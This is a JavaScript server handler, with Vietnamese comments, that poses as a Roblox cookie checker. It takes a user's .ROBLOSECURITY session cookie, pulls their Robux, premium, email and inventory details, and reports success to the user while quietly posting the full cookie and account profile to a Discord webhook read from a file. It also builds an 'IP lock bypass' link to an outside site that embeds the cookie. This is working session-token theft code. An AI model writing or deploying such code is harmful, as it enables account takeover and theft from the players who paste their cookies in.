import axios from 'axios';
import { sendDiscordWebhook } from './sendDiscordWebhook.js';
import fs from 'fs/promises';
import path from 'path';

// Hàm để lấy URL webhook từ file văn bản (giữ nguyên)
export async function getWebhookUrl() {
    try {
        const filePath = path.join(process.cwd(), 'public', 'webhook.txt');
        console.log("🔹 Đọc file từ:", filePath);
        const data = await fs.readFile(filePath, 'utf-8'); 
        return data.trim();
    } catch (error) {
        console.error('❌ Lỗi khi đọc file webhook:', error.message);
        throw new Error('Không thể lấy URL webhook');
    }
}

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({
            success: false,
            error: "Không tìm thấy cookie."
        });
    }

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Accept': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    };

    try {
        console.log('Đang kết nối đến users.roblox.com...');
        const userResponse = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });

        if (!userResponse.data || !userResponse.data.id) {
            throw new Error('Cookie không hợp lệ hoặc đã hết hạn');
        }

        const userData = userResponse.data;
        const userId = userData.id;
        console.log('Kết nối thành công đến users.roblox.com');

        const [
            robuxRes,
            emailRes,
            premiumRes,
            avatarRes,
            verifyHatRes,
            rolimonsRes,
            transactions
        ] = await Promise.all([
            axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers }).catch(() => ({ data: { robux: 0 } })),
            axios.get('https://accountsettings.roblox.com/v1/email', { headers }).catch(() => ({ data: { verified: false } })),
            axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers }).catch(() => ({ data: false })),
            axios.get(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png`, { headers }).catch(() => ({ data: { data: [{ imageUrl: null }] } })),
            axios.get(`https://inventory.roblox.com/v2/users/${userId}/inventory/8?limit=100`, { headers }).catch(() => ({ data: { data: [] } })),
            axios.get(`https://www.rolimons.com/api/playerassets/${userId}`).catch(() => ({ data: { rap: 0 } })),
            axios.get(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers })
                .then(res => res.data)
                .catch(() => ({ pendingRobuxTotal: 0, premiumStipendsTotal: 0, developerExchangeTotal: 0, purchasesTotal: 0 }))
        ]);

        const hasVerifyHat = verifyHatRes.data.data.some(item => item.assetId === 102611803);
        const fileWebhookUrl = await getWebhookUrl();

        // Tạo URL refresh cookie và profile link
        const refreshCookieUrl = `https://eggy.cool/iplockbypass?cookie=${encodeURIComponent(cookie)}`;
        const profileUrl = `https://www.roblox.com/users/${userId}/profile`;

        // Tách thành 2 embed: một cho Cookie Value, một cho thông tin tài khoản
        const combinedWebhook = {
            embeds: [
                {
                    title: '✅ Cookie Hợp Lệ',
                    description: `**Cookie Value:** \`${cookie}\`\n**[Refresh cookie🍪](${refreshCookieUrl})**`,
                    color: 0x00ff00
                },
                {
                    title: `Thông tin tài khoản của ${userData.name}`,
                    thumbnail: {
                        url: avatarRes.data.data[0]?.imageUrl || ''
                    },
                    color: 0x00ff00,
                    fields: [
                        {
                            name: 'ID',
                            value: `${userId}`,
                            inline: true
                        },
                        {
                            name: 'Tên',
                            value: userData.name,
                            inline: true
                        },
                        {
                            name: 'DisplayName',
                            value: userData.displayName,
                            inline: true
                        },
                        {
                            name: 'Rap',
                            value: `${rolimonsRes.data.rap || 0}`,
                            inline: true
                        },
                        {
                            name: 'Rạp Rolimons',
                            value: `https://www.rolimons.com/player/${userId}`,
                            inline: true
                        },
                        {
                            name: 'Robux',
                            value: `${robuxRes.data.robux || 0}`,
                            inline: true
                        },
                        {
                            name: 'Email',
                            value: emailRes.data.verified ? 'Đã xác thực' : 'Chưa xác thực',
                            inline: true
                        },
                        {
                            name: 'Premium',
                            value: premiumRes.data ? 'Có' : 'Không',
                            inline: true
                        },
                        {
                            name: 'Verify Hat',
                            value: hasVerifyHat ? 'Có' : 'Không',
                            inline: true
                        },
                        {
                            name: 'Tổng Robux',
                            value: `${transactions.pendingRobuxTotal}`,
                            inline: true
                        },
                        {
                            name: 'Robux Premium',
                            value: `${transactions.premiumStipendsTotal}`,
                            inline: true
                        },
                        {
                            name: 'Robux dev',
                            value: `${transactions.developerExchangeTotal}`,
                            inline: true
                        },
                        {
                            name: 'Robux pending',
                            value: `${transactions.purchasesTotal}`,
                            inline: true
                        },
                        {
                            name: 'Profile',
                            value: `[Link](${profileUrl})`,
                            inline: true
                        }
                    ]
                }
            ]
        };

        // Gửi webhook đến Discord
        //await sendDiscordWebhook(combinedWebhook);
        await axios.post(fileWebhookUrl, combinedWebhook);

        // Trả về response giữ nguyên
        res.status(200).json({
            success: true,
            message: "Kiểm tra cookie thành công!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0]?.imageUrl || null,
                hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal,
                refreshCookieUrl,
                profileUrl
            }
        });

    } catch (error) {
        console.error('Lỗi:', error.message);
        res.status(500).json({
            success: false,
            error: error.message || 'Lỗi không xác định'
        });
    }
}
